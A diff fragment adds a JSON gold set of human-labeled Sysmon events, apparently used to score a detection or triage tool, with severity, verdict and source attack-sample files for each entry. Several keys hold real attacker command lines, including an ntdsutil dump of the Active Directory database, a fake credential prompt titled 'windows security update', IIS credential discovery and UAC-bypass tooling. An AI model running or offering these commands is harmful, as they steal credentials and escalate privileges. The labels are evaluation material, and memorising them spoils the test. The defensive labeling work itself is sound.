+      "AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|wmic.exe|c:\\windows\\system32\\wbem|cmd.exe|process /format:list": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 3.0
+  },
+  "7|mmc.exe|c:\\windows\\system32||c:\\windows\\system32\\tiledatarepository.dll": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "7|conhost.exe|c:\\windows\\system32||c:\\windows\\system32\\ntmarta.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "7|dllhost.exe|c:\\windows\\system32||c:\\windows\\system32\\ole32.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "1|csrss.exe|c:\\windows\\system32|smss.exe|objectdirectory=\\windows sharedsection=<n>,<n>,<n> windows=on subsystemtype=windows serverdll=basesrv,1 serverdll=winsrv:userserverdllinitialization,3 serverdll=winsrv:conserverdllinitialization,2 serverdll=sxssrv,4 profilecontrol=off maxrequestthreads=16": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 8,
+    "srcs": [
+      "Command and Control/DE_sysmon-3-rdp-tun.evtx",
+      "Persistence/persistence_sysmon_11_13_1_shime_appfix.evtx",
+      "Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 0.0
+  },
+  "13|lsass.exe|c:\\windows\\system32||hklm\\sam\\sam\\domains\\builtin\\aliases\\<n>\\c": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 4,
+    "srcs": [
+      "Persistence/sysmon_local_account_creation_and_added_admingroup_12_13.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.0
+  },
+  "11|spoolsv.exe|c:\\windows\\system32||c:\\windows\\system32\\spool\\v4dirs\\<guid>": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_registry_symlink_CVE-2020-1377.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "13|svchost.exe|c:\\windows\\system32||hklm\\software\\microsoft\\windows nt\\currentversion\\networklist\\profiles\\{<guid>}\\categorytype": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"ntdsutil \u00e2\u20ac\u0153ac i ntds\u00e2\u20ac\u009d \u00e2\u20ac\u0153ifm\u00e2\u20ac\u009d \u00e2\u20ac\u0153create full c:\\atomic_red_team q q\"": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|appcmd.exe|c:\\windows\\system32\\inetsrv|powershell.exe|list apppool \". )\" /text:processmodel.username": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 9.0
+  },
+  "1|python.exe|c:\\python27|cmd.exe|python winpwnage.py -u execute -i 11 -p c:\\windows\\system32\\calc.exe": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/exec_sysmon_1_ftp.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "3|powershell.exe|c:\\windows\\system32\\windowspowershell\\v1.0||wk:389|dns": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Discovery/discovery_sysmon_3_Invoke_UserHunter_SourceMachine.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "7|dllhost.exe|c:\\windows\\system32||c:\\windows\\system32\\winsta.dll": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "11|rundll32.exe|c:\\windows\\system32||c:\\windows\\temp\\dumpert.dmp": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"powershell.exe -command { = system.management.automation.internal.host.internalhost.ui.promptforcredential('windows security update', '',[environment]::username, [environment]::userdomainname); echo .getnetworkcredential().password;}\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|[1]consent.exe|": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|cmd.exe|/c notepad.exe": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|calc.exe|c:\\windows\\system32|pcalua.exe|": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/exec_sysmon_1_lolbin_pcalua.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "11|byeintegrity5-uac.exe|<profile>\\tools\\privesc\\uac||<profile>\\tools\\privesc\\uac\\system32\\npmproxy.dll": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/sysmon_uacbypass_CDSSync_schtask_hijack_byeintegrity5.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  }
+}
